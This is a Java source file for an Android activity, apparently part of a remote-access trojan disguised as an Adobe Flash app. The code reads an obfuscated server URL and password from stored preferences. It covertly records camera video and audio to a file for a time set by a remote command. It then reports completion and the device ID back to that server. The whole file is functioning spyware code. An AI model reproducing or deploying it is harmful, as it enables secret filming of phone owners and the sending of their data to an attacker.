package com.connect;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URLEncoder;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.media.MediaRecorder.OutputFormat;
import android.os.Bundle;
import android.os.Environment;
import android.os.ParcelFileDescriptor;
import android.os.StrictMode;
import android.preference.PreferenceManager;
import android.provider.Settings.Secure;
import android.util.Base64;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.Window;
import android.view.WindowManager;
import com.adobe.flash13.R;

public class VideoView extends Activity implements /*OnClickListener,*/ SurfaceHolder.Callback {
    MediaRecorder recorder;
    SurfaceHolder holder = null;
    boolean recording = false;
    
	private String URL;
	private String password;
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
 		try {
 			URL = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("URL", ""), Base64.DEFAULT ));
 			password = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("password", ""), Base64.DEFAULT ));
		} catch (Exception e1) {e1.printStackTrace();}
 		
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        

        recorder = new MediaRecorder();
        try {
			initRecorder();
		} catch (UnknownHostException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
        setContentView(R.layout.videoview);

        SurfaceView cameraView = (SurfaceView) findViewById(R.id.surface_camera);
        holder = cameraView.getHolder();
        holder.addCallback(this);
        holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
    }

    private void initRecorder() throws UnknownHostException, IOException {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH_mm");
        String currentDateandTime = sdf.format(new Date());
        
        String filename = currentDateandTime + ".mp4";
        File diretory = new File(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Videos");
        diretory.mkdirs();
     	File outputFile = new File(diretory, filename);
		
        Intent sender=getIntent();
        String cameraNumber = sender.getExtras().getString("Camera");
        String time = sender.getExtras().getString("Time");
        Camera camera = Camera.open(Integer.parseInt(cameraNumber));
	                    
            int cameraCount = 0; 
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo(); 
            cameraCount = Camera.getNumberOfCameras();
            for ( int camIdx = 0; camIdx < cameraCount; camIdx++ ) { 
                Camera.getCameraInfo( camIdx, cameraInfo ); 
                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK && cameraNumber.equalsIgnoreCase("0")) { 
                    try { 
                    	Log.i("com.connect", "Back" + camIdx);
                        camera = Camera.open( camIdx ); 
                    } catch (RuntimeException e) { 
                    } 
                }                    
                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT && cameraNumber.equalsIgnoreCase("1")) { 
                    try {
                    	Log.i("com.connect", "Front" + camIdx);
                        camera = Camera.open( camIdx ); 
                    } catch (RuntimeException e) { 
                    } 
                }
            } 
            
        CamcorderProfile cpHigh = null;
        if(Integer.parseInt(cameraNumber) == 0)
        {
        	cpHigh = CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH); //if camera = 0
        }
		camera.unlock();
		
		recorder.setOrientationHint(270);

		recorder.setCamera(camera);		
	    recorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
	    recorder.setVideoSource(MediaRecorder.VideoSource.DEFAULT);

     	if(Integer.parseInt(cameraNumber)==0)
     	{
    	    recorder.setProfile(cpHigh);
     	}
     	
    	Log.i("com.connect", "Profiled");
     	if(Integer.parseInt(cameraNumber)==1)
     	{
         	recorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_LOW));
         	recorder.setVideoFrameRate(7);     	
        }
     	
	    recorder.setOutputFile(outputFile.toString());
	        
        recorder.setMaxDuration(Integer.parseInt(time)); 
        recorder.setMaxFileSize(100000000); //100 mb
    }

    private void prepareRecorder() {
        recorder.setPreviewDisplay(holder.getSurface());

        try {
            recorder.prepare();
            recorder.start();


        } catch (IllegalStateException e) {
            e.printStackTrace();
            finish();
        } catch (IOException e) {
            e.printStackTrace();
            finish();
        }
    }

    public void surfaceCreated(SurfaceHolder holder) {
        prepareRecorder();
    }

    public void surfaceChanged(SurfaceHolder holder, int format, int width,
            int height) {
    }

    public void surfaceDestroyed(SurfaceHolder holder) {
        if (recording) {
            recorder.stop();
            recording = false;
        }
        recorder.release();
    	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",false).commit();
    	try {
			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Record Video Complete");
		} catch (UnsupportedEncodingException e) {
			 
			e.printStackTrace();
		}
        finish();
        
    }
    
    public InputStream getInputStreamFromUrl(String urlBase, String urlData) throws UnsupportedEncodingException {
    	
//    	Log.d("com.connect", urlBase);
//    	Log.d("com.connect", urlData);

    	String urlDataFormatted=urlData;
    	
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH:mm:ss");
        String currentDateandTime = "[" + sdf.format(new Date()) + "] - ";
        currentDateandTime = URLEncoder.encode (currentDateandTime, "UTF-8");

        if(urlData.length()>1)
        {
        Log.d("com.connect", urlBase + urlData);

    	urlData = currentDateandTime + URLEncoder.encode (urlData, "UTF-8");
    	urlDataFormatted = urlData.replaceAll("\\.", "~period");
    	
    	Log.d("com.connect", urlBase + urlDataFormatted);
        }

    	  InputStream content = null;
      	if(isNetworkAvailable())
      	{
      	  try 
      	  {
      	    Log.i("com.connect", "network push POST");
      	    HttpClient httpclient = new DefaultHttpClient();
      	    HttpResponse response = httpclient.execute(new HttpGet(urlBase + urlDataFormatted));
      	    content = response.getEntity().getContent();
      	    httpclient.getConnectionManager().shutdown();
      	  } catch (Exception e) {
      		  Log.e("com.connect", "exception", e);
      	  }
      	    return content;
      	}
  		return null;
    }
    
    public boolean isNetworkAvailable() {
    	StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
    	StrictMode.setThreadPolicy(policy);
    	return true;
    }
}